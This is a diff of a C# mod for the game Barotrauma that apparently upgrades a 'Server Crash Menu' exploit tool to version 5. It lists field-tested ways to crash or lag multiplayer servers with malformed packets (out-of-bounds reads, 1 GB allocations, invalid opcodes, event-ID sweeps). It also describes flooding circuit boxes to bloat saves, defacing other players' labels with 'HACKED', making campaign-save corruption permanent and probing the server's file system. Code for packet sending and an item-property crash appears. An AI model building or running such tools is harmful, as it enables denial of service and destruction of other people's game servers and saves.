@@ -1,7 +1,9 @@
 using System;
 using System.Collections.Generic;
 using System.Collections.Immutable;
+using System.IO;
 using System.Reflection;
+using System.Text;
 using Barotrauma;
 using Barotrauma.Items.Components;
 using Barotrauma.Networking;
@@ -10,35 +12,30 @@ using Microsoft.Xna.Framework;
 namespace CSHUB.Modules
 {
     // ============================================================
-    //  SERVER CRASH MENU v4 (волна 598)
+    //  SERVER CRASH MENU v5 (волна 599) — по итогам полевых тестов.
     //
-    //  ПОЧЕМУ v3 «НЕ РАБОТАЛ» (разобрано по исходникам):
-    //  • Сырые entity-пакеты: сервер SKIPает событие, если его ID не равен
-    //    «ожидаеый+1» — а обычный геймплей постоянно двигает счётчик.
-    //    Мой «зеркальный» ID был устаревшим → молчаливый скип.
-    //    ФИКС: реальный счётчик через reflection (ClientEntityEventManager.ID)
-    //    + окно из 40 последовательных ID (совпадение в середине окна =
-    //    хвост ОБРАБАТЫВАЕТСЯ: до ~40 исполнений с одного пакета).
-    //  • CircuitBox-эффекты теперь через ПРЯМЫЕ клиентские вызовы
-    //    AddLabel/RenameLabel/AddWire — те же, что в РАБОЧЕМ Lua-скрипте:
-    //    они сами создают серверные события с правильными ID.
-    //  • DoS-пакеты уходили, но эффект на СОЛО невидим (батч-дроп глотается
-    //    молча, лагать некому). Смотри лог сервера / тести на людном.
+    //  ✅ РАБОЧИЕ (проверены юзером, лаг при ×1000):
+    //     SegmentTable, SoldItems, CircuitBox opcode, Чат-ордер,
+    //     CharacterInput, VOIP
+    //  ⚠ ЭКСПЕРИМЕНТАЛЬНО (может не сработать):
+    //     EntityState OOM, Inventory OOB (окно ID ненадёжно),
+    //     CircuitBox NaN, Backup Indices (исправлен: целимся в
+    //     папку сейвов — сервер парсит/декомпрессит каждый бэкап)
     //
-    //  НОВОЕ: поле «СКОЛЬКО РАЗ» — глобальный счётчик отправок для EXEC.
+    //  ⭐ ИЗБРАННОЕ + ✏ ЗАМЕТКИ (сохраняются в файл рядом с игрой:
+    //     CSHUB_crash_menu_notes.txt)
+    //  Панель «СКОЛЬКО РАЗ» — множитель для каждого EXEC.
     // ============================================================
     public class ServerCrashMenuModule : CSModuleBase
     {
         public override string Id   => "crash_menu";
         public override string Name => "Crash Menu";
         public override string Description =>
-            "Краши/DoS/порча. v4: СКОЛЬКО РАЗ + рабочий путь ЦБ.\n\n" +
-            "• «N раз» наверху — множитель для всех EXEC\n" +
-            "• CIRCUIT BOX = прямые вызовы (как твой Lua):\n" +
-            "  AddLabel/RenameLabel/AddWire сами синкуются\n" +
-            "• [INSTANT] DescriptionTag = краш процесса\n" +
-            "• DoS на соло невидим — эффект на людном сервере\n" +
-            "• [SAVE] порча остаётся после рестарта!";
+            "v5: избранное ⭐ + твои заметки ✏ (сохр. в файл).\n\n" +
+            "• Группа ✅ = проверено тобой в бою\n" +
+            "• «N раз» наверху — множитель каждого EXEC\n" +
+            "• ★ в строке = в избранное, ✏ = заметка\n" +
+            "• DoS = лаг на людном сервере (соло невидим)";
 
         public override string Category => "exploit";
 
@@ -48,51 +45,77 @@ namespace CSHUB.Modules
         private static readonly Color RowColor   = new Color(30, 36, 48);
         private static readonly Color SelColor   = new Color(90, 40, 40);
         private static readonly Color HeadColor  = new Color(45, 55, 75);
+        private static readonly Color FavColor   = new Color(255, 230, 120);
+        private static readonly Color ExpColor   = new Color(170, 150, 255);
 
         private static GUIMessageBox _window;
         private static GUIListBox _list;
         private static GUITextBlock _desc;
+        private static GUITextBox _noteBox;
         private static GUITextBox _repeatBox;
+        private static Method _selectedMethod;
 
         private class Method
         {
             public string Title;
             public string Desc;
-            public Func<int, string> Exec; // аргумент = сколько раз
+            public Func<int, string> Exec;
         }
 
+        private static readonly Dictionary<string, bool> Fav = new Dictionary<string, bool>();
+        private static readonly Dictionary<string, string> Notes = new Dictionary<string, string>();
+        private const string NotesFile = "CSHUB_crash_menu_notes.txt";
         private static int _repeat = 100;
 
-        private static readonly Method[] InstMethods = new Method[]
+        private static readonly Method[] WorkingMethods = new Method[]
         {
             new Method
             {
-                Title = "[INSTANT] DescriptionTag (сеттер)",
+                Title = "✅ SegmentTable: битый указатель",
                 Desc =
-"Твой подтверждённый краш. EXEC: находит доступный предмет и\n" +
-"ставит DescriptionTag локально — СЕТТЕР САМ шлёт событие\n" +
-"(как Property Editor, которым ты валил сервер).\n\n" +
-"Если сеттер задедуплен — жми второй метод (raw-пакет).\n" +
-"N раз = предметов/попыток больше (берёт разные предметы).",
-                Exec = ExecDescriptionTag
+"4 байта, чтение таблицы сегментов за буфером.\n" +
+"ПРОВЕРЕНО: лаг при ×1000. Без условий (лобби тоже).",
+                Exec = ExecSegmentTable
             },
             new Method
             {
-                Title = "[INSTANT] DescriptionTag (raw + окно ID)",
+                Title = "✅ SoldItems: несуществующий префаб",
                 Desc =
-"То же самое, но сырым ChangeProperty-событием с ОКНОМ ID:\n" +
-"один пакет несёт N событий подряд — совпадение счётчика в\n" +
-"середине = хвост ОБРАБАТЫВАЕТСЯ (до N исполнений).\n\n" +
-"Работает даже если сеттер дедупнулся.",
-                Exec = ExecDescriptionTagRaw
+"Throw на самом верху кампейн-чтения (до всех проверок).\n" +
+"ПРОВЕРЕНО: лаг при ×1000. Условие: кампания.",
+                Exec = ExecSoldPrefab
             },
             new Method
             {
-                Title = "[CRASHLOOP] EventManager option=200",
+                Title = "✅ CircuitBox: левый opcode",
                 Desc =
-"Смерть на следующем тике. ТОЛЬКО если событийный диалог\n" +
-"(вопрос NPC) сейчас таргетит тебя. Иначе пакет игнор — это норм.",
-                Exec = ExecEventManager
+"Прямой пакет с Opcode=AddComponent → throw свитча.\n" +
+"ПРОВЕРЕНО: лаг при ×1000. Без условий.",
+                Exec = ExecCircuitBox
+            },
+            new Method
+            {
+                Title = "✅ Чат: несуществующий ордер",
+                Desc =
+"Throw на OrderPrefab.Prefabs[id]. Из ЛОББИ тоже.\n" +
+"ПРОВЕРЕНО: лаг при ×1000.",
+                Exec = ExecChatOrder
+            },
+            new Method
+            {
+                Title = "✅ CharacterInput: count=255",
+                Desc =
+"255 инпутов, данных нет → OOB-чтение.\n" +
+"ПРОВЕРЕНО: лаг при ×1000. В раунде.",
+                Exec = ExecCharInput
+            },
+            new Method
+            {
+                Title = "✅ VOIP: пустые буферы",
+                Desc =
+"8×255 байт заявлено, 0 данных → BlockCopy за краем.\n" +
+"ПРОВЕРЕНО: лаг при ×1000. Голос включён, не в муте.",
+                Exec = ExecVoip
             }
         };
 
@@ -100,204 +123,281 @@ namespace CSHUB.Modules
         {
             new Method
             {
-                Title = "☣ LABEL FLOOD — создать N меток",
+                Title = "☣ LABEL FLOOD ×N меток (сейв-блоат)",
                 Desc =
-"Прямой вызов cb.AddLabel() × N — тот же, что в твоём\n" +
-"РАБОЧЕМ Lua. Каждая метка = событие серверу, правильные ID.\n\n" +
-"ЭФФЕКТ: сервер тащит N событий, метки ПЕРСИСТЯТСЯ в сейв\n" +
-"(bloat кампании). Открой ЦБ (SelectedItem) и жми.\n" +
-"N=10000 за раз — сервер захлёбывается обработкой.",
+"cb.AddLabel() ×N — прямой клиентский API (правильные ID).\n" +
+"Метки ПЕРСИСТЯТСЯ в сейв кампании. Открой ЦБ и жми.\n" +
+"N=10000 — сервер захлёбывается событиями.",
                 Exec = ExecLabelFlood
             },
             new Method
             {
-                Title = "☣ RENAME CHAOS — все метки",
+                Title = "☣ RENAME CHAOS — все метки в HACKED",
                 Desc =
-"cb.RenameLabel() всех меток открытого ЦБ (как в Lua).\n" +
-"Хедер/боди='HACKED', красный. Синхронизируется всем.\n\n" +
-"Соц-гриф: чужой ЦБ, если тебе доступен.",
+"cb.RenameLabel() всех меток открытого ЦБ. Синк всем игрокам.",
                 Exec = ExecRenameChaos
             },
             new Method
             {
                 Title = "☣ WIRE CHAOS — все пары связей",
                 Desc =
-"cb.AddWire() для КАЖДОЙ пары Input×Output (как в Lua).\n" +
-"N² проводов = N×N событий + персистентный блоат сейва.\n\n" +
-"10 инпутов × 10 аутпутов = 100 проводов ЗА РАЗ.\n" +
-"N = сколько пар создать.",
+"cb.AddWire() все пары Input×Output = N² проводов.\n" +
+"Постоянные события + персистентный блоат сейва.",
                 Exec = ExecWireChaos
             }
         };
 
-        private static readonly Method[] DosMethods = new Method[]
+        private static readonly Method[] OtherDosMethods = new Method[]
         {
             new Method
             {
-                Title = "[DOS] SoldItems: несуществующий префаб",
+                Title = "⚠ Backup Indices (FIX: папка сейвов)",
                 Desc =
-"Throw на самом верху кампейн-чтения, до всех проверок.\n" +
-"×N = N пакетов. Эффект (лаг) виден на ЛЮДНОМ сервере.\n" +
-"Условие: кампания.",
-                Exec = ExecSoldPrefab
-            },
-            new Method
-            {
-                Title = "[DOS] EntityState: new byte[1ГБ]",
-                Desc =
-"msgLength=1ГБ → сервер аллоцирует до проверки буфера.\n" +
-"Теперь с ОКНОМ ID (N событий в пакете) — попадает в счётчик.\n" +
-"Условие: в раунде.",
-                Exec = ExecEntityStateOom
-            },
-            new Method
-            {
-                Title = "[DOS] Inventory: start=0 end=255",
-                Desc =
-"Хирургически, с ОКНОМ ID: запись за границу receivedItemIds.\n" +
-"Цель: ближайший контейнер. Условие: в раунде.",
-                Exec = ExecInventoryOob
-            },
-            new Method
-            {
-                Title = "[DOS] CircuitBox NaN (MoveComponent)",
-                Desc =
-"С ОКНОМ ID: MoveAmount=NaN на узлы ЦБ. ★ ПЕРСИСТИТСЯ В СЕЙВ!\n" +
-"Только своя тест-кампания!",
-                Exec = ExecCircuitBoxNaN
-            },
-            new Method
-            {
-                Title = "[DOS] SegmentTable: битый указатель",
-                Desc =
-"4 байта, чтение таблицы за буфером. Без условий (лобби).",
-                Exec = ExecSegmentTable
-            },
-            new Method
-            {
-                Title = "[DOS] CircuitBox: левый opcode",
-                Desc =
-"Прямой пакет с Opcode=AddComponent → throw свитча. Без условий.",
-                Exec = ExecCircuitBox
-            },
-            new Method
-            {
-                Title = "[DOS] Чат: несуществующий ордер",
-                Desc =
-"Throw на OrderPrefab.Prefabs[id]. Из ЛОББИ тоже.",
-                Exec = ExecChatOrder
-            },
-            new Method
-            {
-                Title = "[DOS] CharacterInput: count=255",
-                Desc =
-"255 инпутов, данных нет → OOB. Условие: в раунде.",
-                Exec = ExecCharInput
-            },
-            new Method
-            {
-                Title = "[DOS] VOIP: пустые буферы",
-                Desc =
-"8×255 байт заявлено, 0 данных. Голос включён, не в муте.",
-                Exec = ExecVoip
-            },
-            new Method
-            {
-                Title = "[DOS] Backup Indices: скан ФС",
-                Desc =
-"Сервер листает ЛЮБОЙ каталог + метаданные тебе. Спам = IO.",
+"ИСПРАВЛЕНО: целимся в Saves/Multiplayer/* с wildcard —\n" +
+"сервер ДЕКОМПРЕССИРУЕТ каждый найденный бэкап = реальный CPU.\n" +
+"C:\\Windows был пуст на совпадения — потому и тишина.\n" +
+"Бонус: метаданные сейвов приходят тебе.",
                 Exec = ExecBackupScan
-            }
-        };
-
-        private static readonly Method[] SpecialMethods = new Method[]
-        {
-            new Method
-            {
-                Title = "[PERM-DOS] SelectMode: modeIndex 9999",
-                Desc =
-"GameModes[9999] OOB. Нужен перм SelectMode, иначе отказ.",
-                Exec = ExecSelectMode
             },
             new Method
             {
-                Title = "[WINDOW] LoadCampaign: мусорный файл",
+                Title = "⚠ DescriptionTag (сеттер)",
                 Desc =
-"CAMPAIGN_SETUP_INFO с C:\\zzz_garbage.save. В окне 586/соло\n" +
-"сервер попробует грузить мусор. Без окна — молчит.",
-                Exec = ExecLoadGarbage
+"КРАШ ПРОЦЕССА (твой подтверждённый). Ставит свойство\n" +
+"доступному предмету — сеттер сам шлёт событие.\n" +
+"Если дедуп — жми второй вариант (raw).",
+                Exec = ExecDescriptionTag
+            },
+            new Method
+            {
+                Title = "⚠ DescriptionTag (raw + окно ID)",
+                Desc =
+"Raw ChangeProperty с окном ID (до 40 событий в пакете).\n" +
+"Работает если дедупнут сеттер.",
+                Exec = ExecDescriptionTagRaw
+            },
+            new Method
+            {
+                Title = "⚠ EventManager option=200 (краш циклом)",
+                Desc =
+"Смерть на следующем тике. ТОЛЬКО при активном диалоге на тебя.\n" +
+"×N = N попыток.",
+                Exec = ExecEventManager
+            },
+            new Method
+            {
+                Title = "⚠ [SAVE] CircuitBox NaN (MoveComponent)",
+                Desc =
+"NaN все узлы ЦБ. ПЕРСИСТИТСЯ В СЕЙВ после фиксации!\n" +
+"★ Только своя тест-кампания.",
+                Exec = ExecCircuitBoxNaN
             },
             new Method
             {
                 Title = "☣ ЗАФИКСИРОВАТЬ порчу (сейв кампании)",
                 Desc =
-"ManageRound(end=true, save=true): на дружелюбном аутпосте\n" +
-"сервер СОХРАНЯЕТ текущее (замараенное NaN/метками) состояние\n" +
-"В СЕЙВ навсегда. Соло/перм ManageRound/окно 586.\n\n" +
-"★ Полный пайплайн: Crash Menu (NaN/метки) → эта кнопка →\n" +
-"рестарт → кампания глючит/крашится. СВОЯ КАМПАНИЯ!",
+"ManageRound(end,save): аутпост сохранит замараенное состояние\n" +
+"НАВСЕГДА. Соло/перм ManageRound/окно 586.",
                 Exec = ExecForceSave
             }
         };
 
-        public override string GetLabel() => "Crash Menu 💥";
+        private static readonly Method[] ExperimentalMethods = new Method[]
+        {
+            new Method
+            {
+                Title = "⚠ ЭКСПЕРИМЕНТ: EntityState OOM (1ГБ)",
+                Desc =
+"msgLength=1ГБ → new byte до проверки. Окно ID НЕНАДЁЖНО\n" +
+"(геймплей двигает счётчик) — может молча скипаться.\n" +
+"Оставлено для тестов с вербоз-логом сервера.",
+                Exec = ExecEntityStateOom
+            },
+            new Method
+            {
+                Title = "⚠ ЭКСПЕРИМЕНТ: Inventory start=0 end=255",
+                Desc =
+"Запись за границу receivedItemIds ближайшего контейнера.\n" +
+"Та же проблема окна ID. Может не сработать.",
+                Exec = ExecInventoryOob
+            },
+            new Method
+            {
+                Title = "⚠ [PERM] SelectMode: modeIndex 9999",
+                Desc =
+"GameModes[9999] OOB. Нужен перм SelectMode, иначе отказ в логе.",
+                Exec = ExecSelectMode
+            },
+            new Method
+            {
+                Title = "⚠ [WINDOW] LoadCampaign: мусорный файл",
+                Desc =
+"C:\\zzz_garbage.save. Сработает в окне 586/соло, иначе молчит.",
+                Exec = ExecLoadGarbage
+            }
+        };
+
+        public override string GetLabel()
+        {
+            int f = 0;
+            foreach (var kv in Fav) { if (kv.Value) { f++; } }
+            return f > 0 ? $"Crash Menu 💥 [{f} ⭐]" : "Crash Menu 💥";
+        }
 
         public override void OnClick()
         {
             if (_window != null) { CloseWindow(); return; }
+            LoadNotes();
             BuildWindow();
         }
 
+        // ========================================================
+        //  ХРАНИЛИЩЕ ЗАМЕТОК/ИЗБРАННОГО
+        // ========================================================
+        private static void LoadNotes()
+        {
+            try
+            {
+                if (!File.Exists(NotesFile)) { return; }
+                foreach (string line in File.ReadAllLines(NotesFile))
+                {
+                    if (string.IsNullOrEmpty(line)) { continue; }
+                    string[] parts = line.Split('\t');
+                    if (parts.Length < 2) { continue; }
+                    if (parts[0] == "F" && parts.Length >= 2)
+                    {
+                        Fav[parts[1]] = parts[2] == "1";
+                    }
+                    else if (parts[0] == "N" && parts.Length >= 3)
+                    {
+                        Notes[parts[1]] = parts[2].Replace("\\n", "\n");
+                    }
+                }
+            }
+            catch { }
+        }
+
+        private static void SaveNotes()
+        {
+            try
+            {
+                var sb = new StringBuilder();
+                foreach (var kv in Fav) { sb.Append("F\t").Append(kv.Key).Append('\t').Append(kv.Value ? "1" : "0").Append('\n'); }
+                foreach (var kv in Notes)
+                {
+                    sb.Append("N\t").Append(kv.Key).Append('\t')
+                      .Append(kv.Value.Replace("\n", "\\n")).Append('\n');
+                }
+                File.WriteAllText(NotesFile, sb.ToString());
+            }
+            catch (Exception e)
+            {
+                GUI.AddMessage("[CrashMenu] save fail: " + e.Message, DangerColor);
+            }
+        }
+
+        private static bool IsFav(string title)
+        {
+            return Fav.ContainsKey(title) && Fav[title];
+        }
+
+        // ========================================================
+        //  GUI
+        // ========================================================
         private static void BuildWindow()
         {
             try
             {
-                _window = new GUIMessageBox("Server Crash Menu v4", "", Array.Empty<LocalizedString>(), new Vector2(0.82f, 0.92f));
+                _window = new GUIMessageBox("Server Crash Menu v5", "", Array.Empty<LocalizedString>(), new Vector2(0.85f, 0.93f));
                 var content = _window.Content;
                 content.ClearChildren();
 
                 // ---- панель ПОВТОРОВ ----
                 var repFrame = new GUIFrame(
-                    new RectTransform(new Vector2(1f, 0.07f), content.RectTransform, Anchor.TopCenter), style: null);
+                    new RectTransform(new Vector2(1f, 0.065f), content.RectTransform, Anchor.TopCenter), style: null);
                 repFrame.Color = new Color(60, 45, 30);
                 var repLayout = new GUILayoutGroup(
                     new RectTransform(new Vector2(0.98f, 0.85f), repFrame.RectTransform, Anchor.Center), isHorizontal: true);
                 var repLabel = new GUITextBlock(
-                    new RectTransform(new Vector2(0.45f, 1f), repLayout.RectTransform),
-                    "СКОЛЬКО РАЗ отправлять:", textAlignment: Alignment.CenterLeft);
+                    new RectTransform(new Vector2(0.4f, 1f), repLayout.RectTransform),
+                    "СКОЛЬКО РАЗ (множитель EXEC):", textAlignment: Alignment.CenterLeft);
                 repLabel.TextColor = AccentColor;
                 repLabel.CanBeFocused = false;
                 var boxFrame = new GUIFrame(new RectTransform(new Vector2(0.3f, 1f), repLayout.RectTransform), style: null);
                 _repeatBox = new GUITextBox(new RectTransform(Vector2.One, boxFrame.RectTransform), _repeat.ToString());
-                var applyBtn = new GUIButton(new RectTransform(new Vector2(0.24f, 1f), repLayout.RectTransform), "OK");
+                var applyBtn = new GUIButton(new RectTransform(new Vector2(0.25f, 1f), repLayout.RectTransform), "OK");
                 applyBtn.OnClicked = (b, d) => { ParseRepeat(); return true; };
 
-                _list = new GUIListBox(new RectTransform(new Vector2(1f, 0.43f), content.RectTransform, Anchor.TopCenter)
-                    { RelativeOffset = new Vector2(0f, 0.075f) });
+                _list = new GUIListBox(new RectTransform(new Vector2(1f, 0.38f), content.RectTransform, Anchor.TopCenter)
+                    { RelativeOffset = new Vector2(0f, 0.07f) });
                 _list.Color = new Color(20, 25, 35);
 
-                AddGroupHeader("☠ УБИВАЮТ ПРОЦЕСС", OkColor);
-                AddMethods(InstMethods);
-                AddGroupHeader("☣ CIRCUIT BOX — прямой API (работает!)", DangerColor);
-                AddMethods(CircuitMethods);
-                AddGroupHeader("⚠ DoS — лаг/десинк (соло невидим)", AccentColor);
-                AddMethods(DosMethods);
-                AddGroupHeader("🔧 ОСОБЫЕ", HeadColor);
-                AddMethods(SpecialMethods);
+                // ---- избранное наверху ----
+                bool anyFav = false;
+                foreach (Method m in AllMethods())
+                {
+                    if (IsFav(m.Title)) { anyFav = true; break; }
+                }
+                if (anyFav)
+                {
+                    AddGroupHeader("⭐ ИЗБРАННОЕ", FavColor);
+                    foreach (Method m in AllMethods())
+                    {
+                        if (IsFav(m.Title)) { AddMethodRow(m); }
+                    }
+                }
 
+                AddGroupHeader("✅ РАБОЧИЕ — проверено в бою", OkColor);
+                AddMethods(WorkingMethods);
+                AddGroupHeader("☣ CIRCUIT BOX — прямой API (персист в сейв)", DangerColor);
+                AddMethods(CircuitMethods);
+                AddGroupHeader("⚠ ОСТАЛЬНЫЕ DoS / КРАШ ПРОЦЕССА", AccentColor);
+                AddMethods(OtherDosMethods);
+                AddGroupHeader("🔧 ЭКСПЕРИМЕНТАЛЬНО / ПЕРМ / ОКНО", ExpColor);
+                AddMethods(ExperimentalMethods);
+
+                // ---- нижняя панель: описание + заметка ----
                 _desc = new GUITextBlock(
-                    new RectTransform(new Vector2(1f, 0.39f), content.RectTransform, Anchor.BottomCenter)
-                        { RelativeOffset = new Vector2(0f, 0.05f) },
-                    "EXEC × «сколько раз». Клик по названию = описание.", textAlignment: Alignment.CenterLeft);
+                    new RectTransform(new Vector2(1f, 0.16f), content.RectTransform, Anchor.BottomCenter)
+                        { RelativeOffset = new Vector2(0f, 0.155f) },
+                    "Клик по названию = описание. ★ = избранное.", textAlignment: Alignment.CenterLeft);
                 _desc.TextColor = AccentColor;
                 _desc.CanBeFocused = false;
                 try { _desc.Wrap = true; } catch { }
+
+                var noteFrame = new GUIFrame(
+                    new RectTransform(new Vector2(1f, 0.12f), content.RectTransform, Anchor.BottomCenter), style: null);
+                noteFrame.Color = new Color(25, 30, 42);
+                var noteLayout = new GUILayoutGroup(
+                    new RectTransform(new Vector2(0.98f, 0.9f), noteFrame.RectTransform, Anchor.Center), isHorizontal: true);
+                var noteLabel = new GUITextBlock(
+                    new RectTransform(new Vector2(0.12f, 1f), noteLayout.RectTransform),
+                    "Заметка:", textAlignment: Alignment.CenterLeft);
+                noteLabel.TextColor = FavColor;
+                noteLabel.CanBeFocused = false;
+                var noteBoxFrame = new GUIFrame(new RectTransform(new Vector2(0.6f, 1f), noteLayout.RectTransform), style: null);
+                _noteBox = new GUITextBox(new RectTransform(Vector2.One, noteBoxFrame.RectTransform), "");
+                try { _noteBox.MaxTextLength = 400; } catch { }
+                var saveNoteBtn = new GUIButton(new RectTransform(new Vector2(0.14f, 0.9f), noteLayout.RectTransform), "💾 Сохр.");
+                saveNoteBtn.Color = new Color(60, 110, 60);
+                saveNoteBtn.OnClicked = (b, d) => { SaveNoteForSelected(); return true; };
+                var delNoteBtn = new GUIButton(new RectTransform(new Vector2(0.13f, 0.9f), noteLayout.RectTransform), "🗑 Удалить");
+                delNoteBtn.Color = new Color(110, 60, 60);
+                delNoteBtn.OnClicked = (b, d) => { DeleteNoteForSelected(); return true; };
             }
             catch (Exception e)
             {
                 GUI.AddMessage("[CrashMenu] GUI fail: " + e.Message, DangerColor);
                 CloseWindow();
             }
+        }
+
+        private static IEnumerable<Method> AllMethods()
+        {
+            foreach (Method m in WorkingMethods) { yield return m; }
+            foreach (Method m in CircuitMethods) { yield return m; }
+            foreach (Method m in OtherDosMethods) { yield return m; }
+            foreach (Method m in ExperimentalMethods) { yield return m; }
         }
 
         private static void ParseRepeat()
@@ -334,41 +434,125 @@ namespace CSHUB.Modules
 
         private static void AddMethods(Method[] methods)
         {
-            foreach (Method m in methods)
+            foreach (Method m in methods) { AddMethodRow(m); }
+        }
+
+        private static void AddMethodRow(Method m)
+        {
+            Method mm = m;
+            bool fav = IsFav(mm.Title);
+            string note;
+            bool hasNote = Notes.TryGetValue(mm.Title, out note);
+
+            var row = new GUIFrame(
+                new RectTransform(new Vector2(1f, 0.085f), _list.Content.RectTransform), style: null);
+            row.Color = fav ? new Color(70, 60, 25) : RowColor;
+            var layout = new GUILayoutGroup(
+                new RectTransform(new Vector2(0.985f, 0.92f), row.RectTransform, Anchor.Center), isHorizontal: true);
+            try { layout.RelativeSpacing = 0.008f; } catch { }
+
+            var favBtn = new GUIButton(
+                new RectTransform(new Vector2(0.06f, 0.9f), layout.RectTransform),
+                fav ? "★" : "☆");
+            favBtn.Color = fav ? new Color(150, 120, 30) : new Color(50, 55, 70);
+            favBtn.OnClicked = (b, d) =>
             {
-                Method mm = m;
-                var row = new GUIFrame(
-                    new RectTransform(new Vector2(1f, 0.085f), _list.Content.RectTransform), style: null);
-                row.Color = RowColor;
-                var layout = new GUILayoutGroup(
-                    new RectTransform(new Vector2(0.985f, 0.92f), row.RectTransform, Anchor.Center), isHorizontal: true);
-                try { layout.RelativeSpacing = 0.008f; } catch { }
+                Fav[mm.Title] = !IsFav(mm.Title);
+                SaveNotes();
+                RebuildList();
+                return true;
+            };
 
-                var execBtn = new GUIButton(
-                    new RectTransform(new Vector2(0.14f, 0.9f), layout.RectTransform), "EXEC ▶");
-                execBtn.Color = SelColor;
-                execBtn.OnClicked = (b, d) =>
-                {
-                    ParseRepeat();
-                    ShowDesc(mm);
-                    RunExec(mm);
-                    return true;
-                };
+            var execBtn = new GUIButton(
+                new RectTransform(new Vector2(0.14f, 0.9f), layout.RectTransform), "EXEC ▶");
+            execBtn.Color = SelColor;
+            execBtn.OnClicked = (b, d) =>
+            {
+                ParseRepeat();
+                ShowDesc(mm);
+                RunExec(mm);
+                return true;
+            };
 
-                var nameBtn = new GUIButton(
-                    new RectTransform(new Vector2(0.85f, 0.9f), layout.RectTransform),
-                    mm.Title, textAlignment: Alignment.CenterLeft);
-                nameBtn.OnClicked = (b, d) => { ShowDesc(mm); return true; };
+            string title = mm.Title + (hasNote ? "  ✏" : "");
+            var nameBtn = new GUIButton(
+                new RectTransform(new Vector2(0.79f, 0.9f), layout.RectTransform),
+                title, textAlignment: Alignment.CenterLeft);
+            nameBtn.Color = fav ? new Color(80, 70, 30) : new Color(40, 48, 64);
+            if (hasNote) { nameBtn.ToolTip = "Заметка: " + note; }
+            nameBtn.OnClicked = (b, d) =>
+            {
+                ShowDesc(mm);
+                if (_noteBox != null) { _noteBox.Text = hasNote ? note : ""; }
+                _selectedMethod = mm;
+                return true;
+            };
 
-                AddSpacer();
+            AddSpacer();
+        }
+
+        private static void RebuildList()
+        {
+            if (_list == null) { return; }
+            _list.Content.ClearChildren();
+            bool anyFav = false;
+            foreach (Method m in AllMethods())
+            {
+                if (IsFav(m.Title)) { anyFav = true; break; }
             }
+            if (anyFav)
+            {
+                AddGroupHeader("⭐ ИЗБРАННОЕ", FavColor);
+                foreach (Method m in AllMethods())
+                {
+                    if (IsFav(m.Title)) { AddMethodRow(m); }
+                }
+            }
+            AddGroupHeader("✅ РАБОЧИЕ — проверено в бою", OkColor);
+            AddMethods(WorkingMethods);
+            AddGroupHeader("☣ CIRCUIT BOX — прямой API (персист в сейв)", DangerColor);
+            AddMethods(CircuitMethods);
+            AddGroupHeader("⚠ ОСТАЛЬНЫЕ DoS / КРАШ ПРОЦЕССА", AccentColor);
+            AddMethods(OtherDosMethods);
+            AddGroupHeader("🔧 ЭКСПЕРИМЕНТАЛЬНО / ПЕРМ / ОКНО", ExpColor);
+            AddMethods(ExperimentalMethods);
         }
 
         private static void ShowDesc(Method m)
         {
             if (_desc == null) { return; }
-            _desc.Text = m.Title + " ×" + _repeat + "\n──────────────────────────────\n" + m.Desc;
+            string note;
+            bool hasNote = Notes.TryGetValue(m.Title, out note);
+            _desc.Text = m.Title + "  ×" + _repeat +
+                (hasNote ? "\n✏ Заметка: " + note : "") +
+                "\n──────────────────────────────\n" + m.Desc;
             _desc.TextColor = AccentColor;
+        }
+
+        private static void SaveNoteForSelected()
+        {
+            if (_selectedMethod == null || _noteBox == null)
+            {
+                GUI.AddMessage("[CrashMenu] Сначала выбери метод (клик по названию)", AccentColor);
+                return;
+            }
+            string text = _noteBox.Text.Trim();
+            if (string.IsNullOrEmpty(text)) { DeleteNoteForSelected(); return; }
+            Notes[_selectedMethod.Title] = text;
+            SaveNotes();
+            GUI.AddMessage("[CrashMenu] ✏ заметка сохранена: " + _selectedMethod.Title, OkColor);
+            RebuildList();
+        }
+
+        private static void DeleteNoteForSelected()
+        {
+            if (_selectedMethod == null) { return; }
+            if (Notes.Remove(_selectedMethod.Title))
+            {
+                SaveNotes();
+                GUI.AddMessage("[CrashMenu] заметка удалена", AccentColor);
+                RebuildList();
+            }
         }
 
         private static void RunExec(Method m)
@@ -405,7 +589,6 @@ namespace CSHUB.Modules
             return 0;
         }
 
-        // Реальный счётчик событий клиента (private UInt16 ID) через reflection
         private static ushort RealNextEventId()
         {
             try
@@ -428,7 +611,6 @@ namespace CSHUB.Modules
             return 0;
         }
 
-        // Корректная сборка: тело пишем внутри using
         private static string SendSweep(ushort entityId, IWriteMessage payload, int count)
         {
             count = Math.Max(1, Math.Min(count, 40));
@@ -453,7 +635,7 @@ namespace CSHUB.Modules
                 }
             }
             GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-            return "сweep " + count + "× (start=" + start + ")";
+            return "sweep " + count + "× (start=" + start + ")";
         }
 
         private static Item SelectedOrNearestCircuitBox(out CircuitBox cb)
@@ -488,168 +670,25 @@ namespace CSHUB.Modules
         }
 
         // ========================================================
-        //  [INSTANT] DescriptionTag через сеттер
+        //  МЕТОДЫ
         // ========================================================
-        private static string ExecDescriptionTag(int n)
+        private static string ExecSegmentTable(int n)
         {
             if (!CanSend()) { return "нет подключения"; }
-            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
-            Character me = Character.Controlled;
-            int done = 0;
-            var tried = new HashSet<ushort>();
-            foreach (Item it in me.HeldItems) { if (TryTag(it, tried)) { done++; } }
-            if (me.Inventory != null)
-            {
-                foreach (Item it in me.Inventory.AllItemsMod) { if (TryTag(it, tried)) { done++; } }
-            }
-            if (done == 0)
-            {
-                Item near = null; float bd = 300f;
-                foreach (Item it in Item.ItemList)
-                {
-                    if (it == null || it.Removed || tried.Contains(it.ID)) { continue; }
-                    float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
-                    if (d < bd) { bd = d; near = it; }
-                }
-                if (near != null && TryTag(near, tried)) { done++; }
-            }
-            return done > 0
-                ? "DescriptionTag выставлен на " + done + " предмет(ов) — сервер должен умереть"
-                : "доступный предмет не найден";
-        }
-
-        private static bool TryTag(Item it, HashSet<ushort> tried)
-        {
-            if (it == null || it.Removed || !tried.Add(it.ID)) { return false; }
-            try
-            {
-                it.DescriptionTag = "zzz_crash_tag_test";
-                return true;
-            }
-            catch { return false; }
-        }
-
-        // ========================================================
-        //  [INSTANT] DescriptionTag raw + sweep
-        // ========================================================
-        private static string ExecDescriptionTagRaw(int n)
-        {
-            if (!CanSend()) { return "нет подключения"; }
-            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
-            Character me = Character.Controlled;
-            Item target = null;
-            foreach (Item it in me.HeldItems) { if (it != null && !it.Removed) { target = it; break; } }
-            if (target == null && me.Inventory != null)
-            {
-                foreach (Item it in me.Inventory.AllItemsMod) { if (it != null && !it.Removed) { target = it; break; } }
-            }
